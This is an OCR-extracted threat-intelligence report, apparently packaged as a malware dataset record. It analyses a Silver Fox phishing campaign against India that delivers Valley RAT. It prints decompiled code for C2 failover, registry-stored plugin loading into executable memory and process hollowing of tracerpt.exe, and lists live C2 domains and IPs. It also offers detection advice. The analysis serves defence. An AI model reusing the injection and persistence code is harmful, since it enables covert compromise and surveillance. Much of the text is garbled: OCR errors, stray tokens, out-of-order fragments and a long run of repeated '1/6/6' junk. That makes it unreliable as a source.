\n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "RegSetValueExW(hKey,L\"d33f351a4aeea5e608853d1a56661059\",0,REG_BINARY,(constBYTE*)dst,cbData);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "lpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nmemcpy_0(lpAddress, dst_1 + 2628, Size);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1